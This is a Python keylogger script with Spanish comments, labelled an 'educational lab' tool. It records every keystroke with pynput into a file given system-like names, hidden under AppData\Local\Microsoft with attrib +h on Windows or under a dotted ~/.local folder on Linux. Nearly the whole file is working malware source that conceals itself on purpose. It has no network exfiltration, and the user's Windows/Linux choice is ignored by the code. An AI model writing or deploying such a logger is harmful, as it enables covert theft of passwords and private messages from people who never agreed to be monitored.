import os
import platform
from pynput import keyboard

# ----------------------------------------------------
# CONFIGURACIÓN SEGÚN SISTEMA OPERATIVO
# ----------------------------------------------------
def configurar_entorno():
    so = platform.system().lower()

    print("[*] Detectando sistema operativo...")

    if so == "windows":
        ruta = os.path.expanduser(r"~\AppData\Local\Microsoft\logs_hidden")
        comando_ocultar = f'attrib +h "{ruta}"'
    else:
        ruta = os.path.expanduser("~/.local/.sys_cache_logs")
        comando_ocultar = ""  # En Linux los ocultamos con el . inicial

    if not os.path.exists(ruta):
        os.makedirs(ruta, exist_ok=True)

    log_path = os.path.join(ruta, ".sys_data_cache.txt")

    # Oculta la carpeta en Windows
    if comando_ocultar:
        os.system(comando_ocultar)

    print(f"[+] Log guardado en: {log_path}")
    return log_path


# ----------------------------------------------------
# KEYLOGGER
# ----------------------------------------------------
class KeyLogger:
    def __init__(self, log_path: str):
        self.log_path = log_path
        self.buffer = ""
        self.ctrl_pressed = False

    def on_press(self, key):
        try:
            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.ctrl_pressed = True

            # Si presiona Ctrl+N (78 ASCII → N)
            if self.ctrl_pressed and hasattr(key, "char") and key.char == "n":
                print("[+] Combinación Ctrl+N detectada → Fin del keylogger.")
                return False

            if hasattr(key, "char") and key.char is not None:
                self.buffer += key.char
            else:
                self.buffer += f"<{key.name}>"

            # Va escribiendo sin saltos de línea
            with open(self.log_path, "a") as f:
                f.write(self.buffer)
                self.buffer = ""

        except Exception as e:
            print(f"Error: {e}")

    def on_release(self, key):
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            self.ctrl_pressed = False

    def iniciar(self):
        print("[+] Keylogger iniciado. Presionar Ctrl+N para detenerlo.\n")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


# ----------------------------------------------------
# PROGRAMA PRINCIPAL
# ----------------------------------------------------
if __name__ == "__main__":
    print("""
====================================
   KEYLOGGER EDUCATIVO (SOLO LAB)
====================================
    """)

    resp = input("¿Usar configuración de Windows o Linux? (w/l): ").lower()

    if resp == "w":
        os_name = "windows"
    else:
        os_name = "linux"

    # Fuerza usar el OS elegido
    print(f"[+] Configurando entorno para {os_name}...\n")
    log_path = configurar_entorno()

    keylogger = KeyLogger(log_path)
    keylogger.iniciar()
